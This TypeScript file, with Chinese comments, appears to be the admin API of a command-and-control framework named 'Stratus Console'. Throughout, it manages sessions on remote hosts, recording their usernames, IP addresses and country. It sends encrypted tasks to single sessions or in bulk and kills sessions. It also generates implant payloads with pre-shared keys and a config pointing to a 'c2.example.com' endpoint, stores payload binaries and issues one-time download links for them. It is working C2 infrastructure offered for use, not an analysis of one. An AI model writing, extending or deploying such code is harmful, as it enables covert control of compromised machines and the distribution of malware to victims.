/**
 * 管理端 REST API（Hono + Drizzle/D1）。
 *
 * 设计约束（见 docs/03-protocol/03-admin-api.md）：
 *   - 服务端只处理密文，永远不解析任务/结果内容
 *   - 列表接口一条 SQL 出全部字段，禁止 N+1
 *   - 写操作异步落审计，不阻塞响应
 */

import { Hono } from 'hono';
import type { Context } from 'hono';
import {
  DEFAULT_POLICY,
  LIMITS,
  QUOTA,
  TASK_CATEGORIES,
  deriveKReg,
  deriveKSess,
  estimateUsage,
  evaluateBudget,
  fromB64u,
  newDownloadToken,
  newPsk,
  newPskId,
  newTid,
  roleAtLeast,
  toB64u,
  type TaskCategory,
} from '@stratus/shared';
import { and, count, createDb, desc, eq, inArray, isNull, like, or, sql, t } from '@stratus/db';
import { apiError, audit, pagination, sortClause } from '../lib/http';
import type { AppEnv } from '../types';

export const api = new Hono<AppEnv>();

const SESSION_SORTS = ['last_seen', 'first_seen', 'host', 'status'];
const TASK_SORTS = ['created_at', 'status', 'cat'];

/* ───────────────────────────── 身份 ───────────────────────────── */

api.get('/me', (c) => {
  const op = c.get('operator');
  return c.json({ id: op.id, email: op.email, role: op.role, request_id: c.get('requestId') });
});

/* ───────────────────────────── 会话 ───────────────────────────── */

api.get('/sessions', async (c) => {
  const db = createDb(c.env.DB);
  const url = new URL(c.req.url);
  const { page, size, offset } = pagination(url);

  const conds = [];
  const status = url.searchParams.get('status');
  if (status) conds.push(eq(t.sessions.status, status));
  const os = url.searchParams.get('os');
  if (os) conds.push(eq(t.sessions.os, os));
  const tag = url.searchParams.get('tag');
  if (tag) conds.push(like(t.sessions.tags, `%${tag}%`));
  const q = url.searchParams.get('q');
  if (q) {
    const pat = `%${q}%`;
    conds.push(
      or(
        like(t.sessions.host, pat),
        like(t.sessions.username, pat),
        like(t.sessions.internalIp, pat),
        like(t.sessions.externalIp, pat),
        like(t.sessions.id, pat),
      )!,
    );
  }
  const where = conds.length ? and(...conds) : undefined;
  const sort = sortClause(url.searchParams.get('sort'), SESSION_SORTS, 'last_seen');
  const orderBy = sort === 'host' ? t.sessions.host : sort === 'first_seen' ? t.sessions.firstSeen : sort === 'status' ? t.sessions.status : t.sessions.lastSeen;

  const rows = await db
    .select({
      id: t.sessions.id,
      host: t.sessions.host,
      username: t.sessions.username,
      os: t.sessions.os,
      arch: t.sessions.arch,
      internalIp: t.sessions.internalIp,
      externalIp: t.sessions.externalIp,
      country: t.sessions.country,
      caps: t.sessions.caps,
      status: t.sessions.status,
      tags: t.sessions.tags,
      note: t.sessions.note,
      firstSeen: t.sessions.firstSeen,
      lastSeen: t.sessions.lastSeen,
    })
    .from(t.sessions)
    .where(where)
    .orderBy(desc(orderBy))
    .limit(size)
    .offset(offset);

  const total = await db
    .select({ n: count() })
    .from(t.sessions)
    .where(where)
    .then((r) => r[0]?.n ?? 0);

  const ids = rows.map((r) => r.id);
  const stats = ids.length
    ? await db
        .select({ sid: t.tasks.sessionId, status: t.tasks.status, n: count() })
        .from(t.tasks)
        .where(inArray(t.tasks.sessionId, ids))
        .groupBy(t.tasks.sessionId, t.tasks.status)
    : [];

  const bySid = new Map<string, Record<string, number>>();
  for (const s of stats) {
    const cur = bySid.get(s.sid) ?? {};
    cur[s.status] = Number(s.n);
    bySid.set(s.sid, cur);
  }

  return c.json({
    items: rows.map((r) => ({
      ...r,
      caps: r.caps ? (JSON.parse(r.caps) as string[]) : [],
      tags: r.tags ? (JSON.parse(r.tags) as string[]) : [],
      task_stats: bySid.get(r.id) ?? { queued: 0, running: 0, done: 0 },
    })),
    total: Number(total),
    page,
    page_size: size,
  });
});

api.get('/sessions/:id', async (c) => {
  const db = createDb(c.env.DB);
  const id = c.req.param('id');
  const row = await db.select().from(t.sessions).where(eq(t.sessions.id, id)).limit(1).then((r) => r[0]);
  if (!row) return apiError(c, 404, 'E_NOT_FOUND', 'session not found');

  const tasks = await db
    .select({
      id: t.tasks.id,
      cat: t.tasks.cat,
      status: t.tasks.status,
      createdAt: t.tasks.createdAt,
      completedAt: t.tasks.completedAt,
      size: t.tasks.size,
    })
    .from(t.tasks)
    .where(eq(t.tasks.sessionId, id))
    .orderBy(desc(t.tasks.createdAt))
    .limit(20);

  return c.json({
    ...row,
    caps: row.caps ? (JSON.parse(row.caps) as string[]) : [],
    tags: row.tags ? (JSON.parse(row.tags) as string[]) : [],
    recent_tasks: tasks,
  });
});

api.delete('/sessions/:id', async (c) => {
  if (c.req.query('confirm') !== '1') return apiError(c, 409, 'E_CONFLICT', 'confirm=1 required');
  const db = createDb(c.env.DB);
  const id = c.req.param('id');
  const now = Math.floor(Date.now() / 1000);
  const row = await db.select({ id: t.sessions.id }).from(t.sessions).where(eq(t.sessions.id, id)).limit(1);
  if (!row.length) return apiError(c, 404, 'E_NOT_FOUND', 'session not found');

  await db.update(t.sessions).set({ status: 'dead', closedAt: now }).where(eq(t.sessions.id, id));

  // 尽力下发 bye（离线也标记 dead，不做重投）
  c.executionCtx.waitUntil(
    c.env.SESSION.get(c.env.SESSION.idFromName(id))
      .fetch('https://do/enqueue', {
        method: 'POST',
        body: JSON.stringify({
          tid: newTid(),
          ct: '',
          n: '',
          cat: 'sys',
          rid: '',
          exp: now + 60,
        }),
      })
      .catch(() => undefined),
  );

  audit(c, { action: 'session.kill', target: id, targetKind: 'session' });
  return c.json({ ok: true, request_id: c.get('requestId') });
});

api.post('/sessions/:id/tags', async (c) => {
  const db = createDb(c.env.DB);
  const id = c.req.param('id');
  const body = (await c.req.json()) as { add?: string[]; remove?: string[] };
  const row = await db.select({ tags: t.sessions.tags }).from(t.sessions).where(eq(t.sessions.id, id)).limit(1).then((r) => r[0]);
  if (!row) return apiError(c, 404, 'E_NOT_FOUND', 'session not found');

  const set = new Set<string>(row.tags ? (JSON.parse(row.tags) as string[]) : []);
  for (const a of body.add ?? []) set.add(a);
  for (const r of body.remove ?? []) set.delete(r);

  await db.update(t.sessions).set({ tags: JSON.stringify([...set]) }).where(eq(t.sessions.id, id));
  audit(c, { action: 'session.tags', target: id, targetKind: 'session' });
  return c.json({ tags: [...set] });
});

/* ───────────────────────────── 任务 ───────────────────────────── */

interface TaskBody {
  cat?: string;
  ttl?: number;
  rid?: string;
  n?: string;
  ct?: string;
  confirm?: boolean;
}

function validateTask(b: TaskBody): { cat: TaskCategory; ttl: number; rid: string; n: string; ct: string } | null {
  if (!b.ct || !b.n) return null;
  if (!b.rid || b.rid.length > 64) return null;
  if (!b.cat || !TASK_CATEGORIES.includes(b.cat as TaskCategory)) return null;
  if (b.ct.length > Math.ceil(LIMITS.maxFrameCt / 3) * 4) return null;
  const ttl = Math.min(Math.max(Number(b.ttl ?? 60), 10), 3600);
  return { cat: b.cat as TaskCategory, ttl, rid: b.rid, n: b.n, ct: b.ct };
}

async function enqueue(
  c: Context<AppEnv>,
  sessionId: string,
  v: { cat: TaskCategory; ttl: number; rid: string; n: string; ct: string },
  operatorId: string,
): Promise<{ taskId: string; online: boolean }> {
  const db = createDb(c.env.DB);
  const tid = newTid();
  const now = Math.floor(Date.now() / 1000);

  await db.insert(t.tasks).values({
    id: tid,
    sessionId,
    operatorId,
    rid: v.rid,
    cat: v.cat,
    status: 'queued',
    size: v.ct.length,
    createdAt: now,
    expiresAt: now + v.ttl,
  });

  const res = await c.env.SESSION.get(c.env.SESSION.idFromName(sessionId)).fetch('https://do/enqueue', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ tid, ct: v.ct, n: v.n, cat: v.cat, rid: v.rid, exp: now + v.ttl }),
  });

  const out = (await res.json().catch(() => ({ online: false }))) as { online?: boolean };
  const online = Boolean(out.online);

  if (online) {
    c.executionCtx.waitUntil(
      db.update(t.tasks).set({ status: 'dispatched', dispatchedAt: now }).where(eq(t.tasks.id, tid)).run(),
    );
  }
  void operatorId;
  return { taskId: tid, online };
}

api.post('/sessions/:id/tasks', async (c) => {
  const op = c.get('operator');
  const body = (await c.req.json().catch(() => ({}))) as TaskBody;
  const v = validateTask(body);
  if (!v) return apiError(c, 400, 'E_VALIDATION', 'cat/rid/n/ct required or too large');

  const db = createDb(c.env.DB);
  const sid = c.req.param('id');
  const exists = await db.select({ id: t.sessions.id }).from(t.sessions).where(eq(t.sessions.id, sid)).limit(1);
  if (!exists.length) return apiError(c, 404, 'E_NOT_FOUND', 'session not found');

  const { taskId, online } = await enqueue(c, sid, v, op.id);
  audit(c, { action: 'task.create', target: sid, targetKind: 'session', meta: { task: taskId, cat: v.cat, sz: v.ct.length } });
  return c.json({ task_id: taskId, queued: true, online, request_id: c.get('requestId') }, 202);
});

api.post('/tasks/bulk', async (c) => {
  const op = c.get('operator');
  const body = (await c.req.json().catch(() => ({}))) as TaskBody & { targets?: string[] };
  const v = validateTask(body);
  if (!v) return apiError(c, 400, 'E_VALIDATION', 'cat/rid/n/ct required');
  const targets = (body.targets ?? []).slice(0, DEFAULT_POLICY.maxTasksPerBulk);
  if (!targets.length) return apiError(c, 400, 'E_VALIDATION', 'targets required');

  const ok: string[] = [];
  const failed: Array<{ sid: string; code: string }> = [];
  for (const sid of targets) {
    try {
      const { taskId } = await enqueue(c, sid, v, op.id);
      ok.push(taskId);
    } catch {
      failed.push({ sid, code: 'E_ENQUEUE' });
    }
  }
  audit(c, { action: 'task.bulk', targetKind: 'session', meta: { ok: ok.length, failed: failed.length, cat: v.cat } });
  return c.json({ ok, failed, request_id: c.get('requestId') }, 202);
});

api.get('/tasks', async (c) => {
  const db = createDb(c.env.DB);
  const url = new URL(c.req.url);
  const { page, size, offset } = pagination(url);
  const conds = [];
  const sid = url.searchParams.get('session_id');
  if (sid) conds.push(eq(t.tasks.sessionId, sid));
  const status = url.searchParams.get('status');
  if (status) conds.push(eq(t.tasks.status, status));
  const cat = url.searchParams.get('cat');
  if (cat) conds.push(eq(t.tasks.cat, cat));
  const where = conds.length ? and(...conds) : undefined;
  const sort = sortClause(url.searchParams.get('sort'), TASK_SORTS, 'created_at');
  const orderBy = sort === 'status' ? t.tasks.status : sort === 'cat' ? t.tasks.cat : t.tasks.createdAt;

  const rows = await db.select().from(t.tasks).where(where).orderBy(desc(orderBy)).limit(size).offset(offset);
  const total = await db.select({ n: count() }).from(t.tasks).where(where).then((r) => r[0]?.n ?? 0);
  return c.json({ items: rows, total: Number(total), page, page_size: size });
});

api.delete('/tasks/:id', async (c) => {
  const db = createDb(c.env.DB);
  const id = c.req.param('id');
  await db.update(t.tasks).set({ status: 'canceled' }).where(and(eq(t.tasks.id, id), eq(t.tasks.status, 'queued')));
  audit(c, { action: 'task.cancel', target: id, targetKind: 'task' });
  return c.json({ ok: true });
});

api.get('/results/:taskId', async (c) => {
  const db = createDb(c.env.DB);
  const taskId = c.req.param('taskId');
  const row = await db.select().from(t.taskResults).where(eq(t.taskResults.taskId, taskId)).limit(1).then((r) => r[0]);
  if (!row) return apiError(c, 404, 'E_NOT_FOUND', 'result not ready');
  return c.json(row);
});

/* ───────────────────────────── 载荷 ───────────────────────────── */

api.get('/payloads', async (c) => {
  const db = createDb(c.env.DB);
  const rows = await db
    .select({
      id: t.payloads.id,
      name: t.payloads.name,
      pskId: t.payloads.pskId,
      os: t.payloads.os,
      arch: t.payloads.arch,
      size: t.payloads.size,
      sha256: t.payloads.sha256,
      createdAt: t.payloads.createdAt,
      revokedAt: t.payloads.revokedAt,
    })
    .from(t.payloads)
    .orderBy(desc(t.payloads.createdAt))
    .limit(200);
  return c.json({ items: rows, total: rows.length, page: 1, page_size: 200 });
});

api.post('/payloads', async (c) => {
  const op = c.get('operator');
  if (!roleAtLeast(op.role, 'admin')) return apiError(c, 403, 'E_FORBIDDEN', 'requires admin');

  const body = (await c.req.json().catch(() => ({}))) as { name?: string; os?: string; arch?: string; note?: string };
  const db = createDb(c.env.DB);

  const key = await db
    .select({ keyId: t.operatorKeys.keyId, pubRaw: t.operatorKeys.pubRaw, fp: t.operatorKeys.fp })
    .from(t.operatorKeys)
    .where(isNull(t.operatorKeys.revokedAt))
    .orderBy(desc(t.operatorKeys.createdAt))
    .limit(1)
    .then((r) => r[0]);

  if (!key) return apiError(c, 409, 'E_CONFLICT', 'register an operator key first (/keys)');

  const psk = newPsk();
  const pskId = newPskId();
  const pskBytes = fromB64u(psk);
  const kReg = toB64u(await deriveKReg(pskBytes));
  const kSess = toB64u(await deriveKSess(pskBytes));
  const id = crypto.randomUUID();
  const now = Math.floor(Date.now() / 1000);

  await db.insert(t.payloads).values({
    id,
    name: body.name ?? `payload-${now}`,
    pskId,
    kReg,
    kSess,
    os: body.os ?? null,
    arch: body.arch ?? null,
    note: body.note ?? null,
    createdAt: now,
  });

  audit(c, { action: 'payload.create', target: id, targetKind: 'payload' });

  const edge = c.env.EDGE_BASE ?? 'https://c2.example.com';
  return c.json(
    {
      id,
      psk_id: pskId,
      // ⚠️ psk 只在这里返回一次；服务端只存派生 key
      psk,
      config: {
        v: 1,
        endpoint: edge,
        psk_id: pskId,
        psk,
        op_pub: key.pubRaw,
        op_fp: key.fp,
        hb: 60,
        jitter: 0.2,
        transport: ['ws', 'http'],
        meta_mode: 'plain',
      },
    },
    201,
  );
});

api.post('/payloads/:id/binary', async (c) => {
  const op = c.get('operator');
  if (!roleAtLeast(op.role, 'admin')) return apiError(c, 403, 'E_FORBIDDEN', 'requires admin');
  const id = c.req.param('id');
  const db = createDb(c.env.DB);
  const row = await db.select({ id: t.payloads.id }).from(t.payloads).where(eq(t.payloads.id, id)).limit(1);
  if (!row.length) return apiError(c, 404, 'E_NOT_FOUND', 'payload not found');

  const body = c.req.raw.body;
  if (!body) return apiError(c, 400, 'E_VALIDATION', 'empty body');

  const name = c.req.query('name') ?? 'payload.bin';
  const key = `${c.env.ENV_NAME}/payloads/${id}/${name}`;
  const put = await c.env.R2.put(key, body, {
    httpMetadata: { contentType: 'application/octet-stream' },
  });

  await db
    .update(t.payloads)
    .set({ r2Key: key, size: put?.size ?? null })
    .where(eq(t.payloads.id, id));

  audit(c, { action: 'payload.binary', target: id, targetKind: 'payload', meta: { size: put?.size ?? 0 } });
  return c.json({ ok: true, size: put?.size ?? 0 });
});

api.post('/payloads/:id/link', async (c) => {
  const id = c.req.param('id');
  const db = createDb(c.env.DB);
  const row = await db
    .select({ id: t.payloads.id, r2Key: t.payloads.r2Key })
    .from(t.payloads)
    .where(eq(t.payloads.id, id))
    .limit(1)
    .then((r) => r[0]);
  if (!row?.r2Key) return apiError(c, 409, 'E_CONFLICT', 'upload binary first');

  const token = newDownloadToken();
  await c.env.TOKENS.put(
    `dl:${token}`,
    JSON.stringify({ payload_id: id, r2_key: row.r2Key, one_time: true }),
    { expirationTtl: 600 },
  );

  audit(c, { action: 'payload.link', target: id, targetKind: 'payload' });
  return c.json({ url: `${c.env.EDGE_BASE ?? ''}/d/${token}`, expires_in: 600 });
});

api.delete('/payloads/:id', async (c) => {
  const op = c.get('operator');
  if (!roleAtLeast(op.role, 'admin')) return apiError(c, 403, 'E_FORBIDDEN', 'requires admin');
  const id = c.req.param('id');
  const db = createDb(c.env.DB);
  await db.update(t.payloads).set({ revokedAt: Math.floor(Date.now() / 1000) }).where(eq(t.payloads.id, id));
  audit(c, { action: 'payload.revoke', target: id, targetKind: 'payload' });
  return c.json({ ok: true });
});

/* ───────────────────────────── 公钥 ───────────────────────────── */

api.get('/keys', async (c) => {
  const db = createDb(c.env.DB);
  const rows = await db
    .select({
      keyId: t.operatorKeys.keyId,
      operatorId: t.operatorKeys.operatorId,
      pubRaw: t.operatorKeys.pubRaw,
      fp: t.operatorKeys.fp,
      createdAt: t.operatorKeys.createdAt,
      revokedAt: t.operatorKeys.revokedAt,
    })
    .from(t.operatorKeys)
    .orderBy(desc(t.operatorKeys.createdAt))
    .limit(50);
  return c.json({ items: rows });
});

api.post('/keys', async (c) => {
  const op = c.get('operator');
  const body = (await c.req.json().catch(() => ({}))) as { keyId?: string; pub?: string; fp?: string };
  if (!body.keyId || !body.pub || !body.fp) return apiError(c, 400, 'E_VALIDATION', 'keyId/pub/fp required');

  const raw = fromB64u(body.pub);
  if (raw.length !== 65 || raw[0] !== 0x04) return apiError(c, 400, 'E_VALIDATION', 'invalid P-256 public key');

  const db = createDb(c.env.DB);
  await db.insert(t.operatorKeys).values({
    id: crypto.randomUUID(),
    operatorId: op.id,
    keyId: body.keyId,
    pubRaw: body.pub,
    fp: body.fp,
    createdAt: Math.floor(Date.now() / 1000),
  });

  audit(c, { action: 'key.register', target: body.keyId, targetKind: 'key' });
  return c.json({ ok: true, key_id: body.keyId }, 201);
});

api.delete('/keys/:keyId', async (c) => {
  const op = c.get('operator');
  if (!roleAtLeast(op.role, 'admin')) return apiError(c, 403, 'E_FORBIDDEN', 'requires admin');
  const keyId = c.req.param('keyId');
  const db = createDb(c.env.DB);
  await db
    .update(t.operatorKeys)
    .set({ revokedAt: Math.floor(Date.now() / 1000) })
    .where(eq(t.operatorKeys.keyId, keyId));
  audit(c, { action: 'key.revoke', target: keyId, targetKind: 'key' });
  return c.json({ ok: true });
});

/* ───────────────────────────── 审计 / 统计 / 配额 ───────────────────────────── */

api.get('/audit', async (c) => {
  const db = createDb(c.env.DB);
  const url = new URL(c.req.url);
  const { page, size, offset } = pagination(url, 100, 500);
  const conds = [];
  const action = url.searchParams.get('action');
  if (action) conds.push(like(t.auditLog.action, `${action}%`));
  const actor = url.searchParams.get('actor');
  if (actor) conds.push(eq(t.auditLog.actorId, actor));
  const target = url.searchParams.get('target');
  if (target) conds.push(eq(t.auditLog.target, target));
  const where = conds.length ? and(...conds) : undefined;

  const rows = await db.select().from(t.auditLog).where(where).orderBy(desc(t.auditLog.ts)).limit(size).offset(offset);
  const total = await db.select({ n: count() }).from(t.auditLog).where(where).then((r) => r[0]?.n ?? 0);
  return c.json({ items: rows, total: Number(total), page, page_size: size });
});

api.get('/stats', async (c) => {
  const db = createDb(c.env.DB);
  const [sessionsTotal, online, tasksTotal, done] = await Promise.all([
    db.select({ n: count() }).from(t.sessions).then((r) => Number(r[0]?.n ?? 0)),
    db.select({ n: count() }).from(t.sessions).where(eq(t.sessions.status, 'online')).then((r) => Number(r[0]?.n ?? 0)),
    db.select({ n: count() }).from(t.tasks).then((r) => Number(r[0]?.n ?? 0)),
    db.select({ n: count() }).from(t.tasks).where(eq(t.tasks.status, 'done')).then((r) => Number(r[0]?.n ?? 0)),
  ]);

  const byCat = await db
    .select({ cat: t.tasks.cat, n: count() })
    .from(t.tasks)
    .groupBy(t.tasks.cat);

  return c.json({
    sessions: { total: sessionsTotal, online },
    tasks: { total: tasksTotal, done, success_rate: tasksTotal ? Number((done / tasksTotal).toFixed(3)) : 0 },
    by_cat: byCat.map((r) => ({ cat: r.cat, n: Number(r.n) })),
  });
});

api.get('/quota', async (c) => {
  const db = createDb(c.env.DB);
  const rows = await db.select().from(t.quotaDaily).orderBy(desc(t.quotaDaily.day)).limit(14);

  const estimate = estimateUsage({
    sessions: 100,
    hours: 24,
    heartbeatSec: 60,
    messagesPerSessionHour: 3,
    avgResultBytes: 2048,
    filesPerDay: 500,
    fileMb: 10,
  });

  return c.json({
    daily: rows,
    free_tier: QUOTA,
    reference_budget: estimate,
    verdicts: evaluateBudget(estimate),
  });
});

/* ───────────────────────────── OpenAPI（手写最小集） ───────────────────────────── */

api.get('/openapi.json', (c) =>
  c.json({
    openapi: '3.1.0',
    info: { title: 'Stratus Console API', version: '0.1.0' },
    servers: [{ url: '/api/v1' }],
    paths: {
      '/me': { get: { summary: 'current operator', responses: { '200': { description: 'ok' } } } },
      '/sessions': { get: { summary: 'list sessions', responses: { '200': { description: 'ok' } } } },
      '/sessions/{id}': {
        get: { summary: 'session detail', responses: { '200': { description: 'ok' } } },
        delete: { summary: 'kill session', responses: { '200': { description: 'ok' } } },
      },
      '/sessions/{id}/tasks': {
        post: { summary: 'enqueue task (E2E ciphertext)', responses: { '202': { description: 'queued' } } },
      },
      '/tasks/bulk': { post: { summary: 'bulk enqueue', responses: { '202': { description: 'queued' } } } },
      '/tasks': { get: { summary: 'list tasks', responses: { '200': { description: 'ok' } } } },
      '/results/{taskId}': { get: { summary: 'task result ciphertext', responses: { '200': { description: 'ok' } } } },
      '/payloads': {
        get: { summary: 'list payloads', responses: { '200': { description: 'ok' } } },
        post: { summary: 'create payload (returns psk once)', responses: { '201': { description: 'created' } } },
      },
      '/keys': {
        get: { summary: 'list operator keys', responses: { '200': { description: 'ok' } } },
        post: { summary: 'register operator public key', responses: { '201': { description: 'created' } } },
      },
      '/audit': { get: { summary: 'audit log', responses: { '200': { description: 'ok' } } } },
      '/stats': { get: { summary: 'dashboard stats', responses: { '200': { description: 'ok' } } } },
      '/quota': { get: { summary: 'quota waterline', responses: { '200': { description: 'ok' } } } },
    },
  }),
);

void sql;
